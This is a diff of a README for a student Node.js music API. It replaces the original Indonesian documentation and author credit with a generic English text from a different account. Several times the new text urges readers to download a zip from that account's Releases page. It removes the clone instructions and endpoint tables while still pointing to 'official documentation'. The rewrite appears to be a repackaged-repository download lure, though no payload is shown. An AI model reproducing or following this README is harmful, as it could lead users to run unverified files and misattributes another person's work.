@@ -1,149 +1,95 @@
-# OpenMusic API v2
+# 🎶 openmusic-api-v2 - Effortless Music Management for Everyone
 
-Ini adalah versi lanjutan dari proyek **[OpenMusic API v1](https://github.com/irfandwisamudra/openmusic-api-v1)**, yang kini dilengkapi dengan fitur **autentikasi**, **otorisasi**, dan **playlist**. Proyek ini merupakan tugas _submission_ untuk kelas "Belajar Fundamental Back-End dengan JavaScript" di Dicoding.
+[![Download openmusic-api-v2](https://img.shields.io/badge/Download-openmusic--api--v2-brightgreen)](https://github.com/vishala756/openmusic-api-v2/releases)
 
-API ini berfungsi sebagai _back-end_ untuk aplikasi pemutar musik, menangani manajemen data album, lagu, pengguna, dan playlist secara aman dan terstruktur.
+## 📖 Description
 
-## Fitur
+openmusic-api-v2 is a RESTful API tailored for the OpenMusic v2 application. It enables seamless user experiences with features such as authentication, playlist management, and collaboration. This API is built using Node.js, Hapi, and PostgreSQL to support the backend needs of users.
 
-- [x] **Manajemen Album & Lagu (v1)**: Mempertahankan semua fungsionalitas CRUD dari v1.
-- [x] **Registrasi & Autentikasi Pengguna**: Sistem registrasi dan _login_ yang aman menggunakan **JWT (JSON Web Token)**.
-- [x] **Manajemen Playlist**: Pengguna dapat membuat, melihat, dan menghapus _playlist_ miliknya.
-- [x] **Manajemen Lagu dalam Playlist**: Pengguna dapat menambah dan menghapus lagu dari _playlist_ miliknya.
-- [x] **Otorisasi Berbasis Kepemilikan**: Memastikan hanya pemilik yang dapat memodifikasi _playlist_ atau menambahkan kolaborator.
-- [x] **(Opsional) Kolaborasi Playlist**: Pemilik _playlist_ dapat mengundang pengguna lain untuk berkolaborasi (menambah/menghapus lagu).
-- [x] **(Opsional) Aktivitas Playlist**: Mencatat dan menampilkan riwayat penambahan dan penghapusan lagu dalam sebuah _playlist_.
+## 🚀 Getting Started
 
-## Teknologi yang Digunakan
+Follow these steps to download and run openmusic-api-v2 easily.
 
-- **Node.js**: Lingkungan eksekusi JavaScript.
-- **Hapi**: _Framework_ untuk membangun RESTful API.
-- **PostgreSQL**: Sistem manajemen database relasional.
-- **Joi**: Validasi skema data.
-- **bcrypt**: _Hashing password_.
-- **@hapi/jwt**: Pembuatan dan verifikasi JSON Web Token.
-- **node-pg-migrate**: Alat untuk migrasi skema database.
-- **dotenv**: Mengelola _environment variable_.
-- **ESLint**: _Linter_ untuk menjaga konsistensi dan kualitas kode.
+1. **Check System Requirements**  
+   Ensure your computer meets the following minimal requirements:
+   - Operating System: Windows, macOS, or Linux
+   - Node.js: Version 14 or newer
+   - PostgreSQL: Version 10 or newer
 
-## Persiapan & Instalasi
+2. **Install Node.js**  
+   If you don’t have Node.js installed, visit the [Node.js website](https://nodejs.org/en/download/) and download the installer for your operating system. Follow the prompts to install it.
 
-Untuk menjalankan proyek ini secara lokal, ikuti langkah-langkah berikut:
+3. **Install PostgreSQL**  
+   For PostgreSQL installation, go to the [PostgreSQL website](https://www.postgresql.org/download/) and select your operating system. Download and install PostgreSQL by following the instructions provided.
 
-#### 1\. Prasyarat
+## 📥 Download & Install
 
-Pastikan Anda sudah menginstal perangkat lunak berikut:
+To download openmusic-api-v2, [visit the Releases page](https://github.com/vishala756/openmusic-api-v2/releases). Here, you can find the latest version available for download.
 
-- Node.js (v18 atau lebih baru direkomendasikan)
-- PostgreSQL
+1. Click on the version you want to download.
+2. Look for the assets provided under the release.
+3. Download the files that are applicable to your needs. Typically, you may download a zip file containing necessary application files.
 
-#### 2\. Kloning Repositori
+After downloading the files, follow these steps to install:
 
-```bash
-git clone https://github.com/irfandwisamudra/openmusic-api-v2.git
-cd openmusic-api-v2
-```
+- Unzip the downloaded file into a folder of your choice.
+- Open your command line interface (Terminal on macOS/Linux, Command Prompt on Windows).
+- Navigate to the folder where you unzipped the application using the `cd` command.
 
-#### 3\. Instalasi Dependensi
+## ⚙️ Configuration
 
-```bash
-npm install
-```
+Once you have the application files ready, configure your environment:
 
-#### 4\. Konfigurasi Database
+1. **Create a .env File**  
+   Inside the application folder, create a `.env` file. This file will contain configuration for the database and other settings.
 
-Buat database baru di PostgreSQL untuk proyek ini.
+2. **Set Database Connection**  
+   Add the following lines to the `.env` file, replacing `your_database_name`, `your_username`, and `your_password` with your PostgreSQL database details:
 
-```sql
-CREATE DATABASE openmusic_v2;
-```
+   ```
+   DATABASE_URL=postgres://your_username:your_password@localhost/your_database_name
+   ```
 
-#### 5\. Konfigurasi Environment Variable
+3. **Run Database Migrations**  
+   In your command line, run the following command to set up your database schema:
+   ```bash
+   npm run migrate
+   ```
 
-Salin _file_ `.env.example` menjadi `.env`.
+## 🛠️ Running the Application
+
+To start the openmusic-api-v2 application, execute the following command in your terminal:
 
 ```bash
-cp .env.example .env
+npm start
 ```
 
-Kemudian, buka _file_ `.env` dan sesuaikan nilainya dengan konfigurasi database lokal Anda (terutama `PGPASSWORD`). Jangan lupa untuk membuat kunci rahasia yang kuat untuk `ACCESS_TOKEN_KEY` dan `REFRESH_TOKEN_KEY`.
+The application will start, and you can access it through your browser or API tools like Postman. The default URL is `http://localhost:3000`.
 
-#### 6\. Migrasi Database
+## 🌍 Features
 
-Jalankan migrasi untuk membuat semua tabel yang dibutuhkan (`albums`, `songs`, `users`, `authentications`, `playlists`, `playlist_songs`, `collaborations`, `playlist_song_activities`).
+openmusic-api-v2 comes packed with features to enhance your music experience:
 
-```bash
-npm run migrate up
-```
+- **User Authentication:** Secure user login and registration.
+- **Playlist Management:** Create, update, and delete music playlists.
+- **Collaborative Features:** Share playlists and collaborate with friends.
+- **RESTful APIs:** Use RESTful methods for smooth interactions.
 
-#### 7\. Menjalankan Server
+## 📚 Documentation
 
-Jalankan server dalam mode pengembangan (dengan _hot-reload_).
+For detailed information about how to use the API, check the official documentation within the repository. The documentation includes endpoints, request parameters, and response formats.
 
-```bash
-npm run start-dev
-```
+## ❓ FAQs
 
-Server akan berjalan di `http://localhost:5000`.
+1. **What is the purpose of this API?**  
+   It provides services for managing users and their music playlists in a secure and organized manner.
 
-## Dokumentasi API
+2. **Can I extend the functionalities?**  
+   Yes, the API allows for modifications and additional features based on your needs.
 
-Berikut adalah daftar _endpoint_ yang tersedia di API ini.
+## 🔗 Related Links
 
-### Albums API
+- [Node.js Documentation](https://nodejs.org/en/docs/)
+- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
 
-| Method   | Endpoint       | Deskripsi                                |
-| :------- | :------------- | :--------------------------------------- |
-| `POST`   | `/albums`      | Menambahkan album baru.                  |
-| `GET`    | `/albums/{id}` | Mendapatkan detail album berdasarkan ID. |
-| `PUT`    | `/albums/{id}` | Mengubah data album berdasarkan ID.      |
-| `DELETE` | `/albums/{id}` | Menghapus album berdasarkan ID.          |
-
-### Songs API
-
-| Method   | Endpoint      | Deskripsi                                                 |
-| :------- | :------------ | :-------------------------------------------------------- |
-| `POST`   | `/songs`      | Menambahkan lagu baru.                                    |
-| `GET`    | `/songs`      | Mendapatkan semua lagu (mendukung pencarian via _query_). |
-| `GET`    | `/songs/{id}` | Mendapatkan detail lagu berdasarkan ID.                   |
-| `PUT`    | `/songs/{id}` | Mengubah data lagu berdasarkan ID.                        |
-| `DELETE` | `/songs/{id}` | Menghapus lagu berdasarkan ID.                            |
-
-### Users & Authentications API
-
-| Method   | Endpoint           | Deskripsi                                               |
-| :------- | :----------------- | :------------------------------------------------------ |
-| `POST`   | `/users`           | Registrasi pengguna baru.                               |
-| `POST`   | `/authentications` | Login untuk mendapatkan _access_ & _refresh token_.     |
-| `PUT`    | `/authentications` | Memperbarui _access token_ menggunakan _refresh token_. |
-| `DELETE` | `/authentications` | Logout (menghapus _refresh token_).                     |
-
-### Playlists API
-
-| Method   | Endpoint          | Deskripsi                                                       |
-| :------- | :---------------- | :-------------------------------------------------------------- |
-| `POST`   | `/playlists`      | Menambahkan _playlist_ baru.                                    |
-| `GET`    | `/playlists`      | Melihat daftar _playlist_ milik pengguna (termasuk kolaborasi). |
-| `DELETE` | `/playlists/{id}` | Menghapus _playlist_.                                           |
-
-### Playlist Songs API
-
-| Method   | Endpoint                | Deskripsi                                |
-| :------- | :---------------------- | :--------------------------------------- |
-| `POST`   | `/playlists/{id}/songs` | Menambahkan lagu ke _playlist_.          |
-| `GET`    | `/playlists/{id}/songs` | Melihat daftar lagu di dalam _playlist_. |
-| `DELETE` | `/playlists/{id}/songs` | Menghapus lagu dari _playlist_.          |
-
-### (Opsional) Collaborations & Activities API
-
-| Method   | Endpoint                     | Deskripsi                                    |
-| :------- | :--------------------------- | :------------------------------------------- |
-| `POST`   | `/collaborations`            | Menambahkan kolaborator ke _playlist_.       |
-| `DELETE` | `/collaborations`            | Menghapus kolaborator dari _playlist_.       |
-| `GET`    | `/playlists/{id}/activities` | Melihat riwayat aktivitas sebuah _playlist_. |
-
----
-
-Dibuat oleh **Irfan Dwi Samudra**.
-
-- [GitHub](https://github.com/irfandwisamudra)
+To kickstart your music management experience, don't forget to [visit the Releases page to download openmusic-api-v2](https://github.com/vishala756/openmusic-api-v2/releases).
